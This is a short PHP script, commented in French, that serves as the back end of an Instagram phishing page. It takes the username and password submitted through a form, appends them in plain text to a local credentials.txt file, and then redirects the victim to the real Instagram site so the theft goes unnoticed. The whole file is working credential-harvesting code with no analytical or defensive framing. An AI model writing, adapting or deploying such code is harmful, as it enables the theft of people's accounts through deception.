<?php
$username = $_POST['username'];
$password = $_POST['password'];

// Enregistrement des identifiants dans un fichier texte
$file = fopen('credentials.txt', 'a');
fwrite($file, "Username: $username\nPassword: $password\n\n");
fclose($file);

// Redirection vers la vraie page Instagram
header('Location: https://www.instagram.com');
exit;
?>